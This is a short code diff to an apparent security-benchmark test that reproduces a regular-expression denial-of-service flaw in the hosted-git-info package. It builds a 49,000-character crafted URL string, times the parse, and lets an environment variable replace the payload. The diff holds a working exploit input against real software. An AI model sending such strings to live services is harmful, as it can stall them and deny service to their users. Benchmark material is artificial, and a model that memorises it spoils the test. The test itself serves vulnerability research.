@@ -2,7 +2,7 @@ test("ReDos in hosted-git-info", () => {
   const genstr = require("../utils").genstr;
   const measureTime = require("../utils").measureTime;
   const hostedGitInfo = require("hosted-git-info");
-  var attack_str = "a:" + genstr(49000, "a") + "!";
+  var attack_str = process.env.SECBENCH_PAYLOAD || ("a:" + genstr(49000, "a") + "!");
   let t = measureTime(function () {
     var parsedInfo = hostedGitInfo.fromUrl(attack_str);
   });
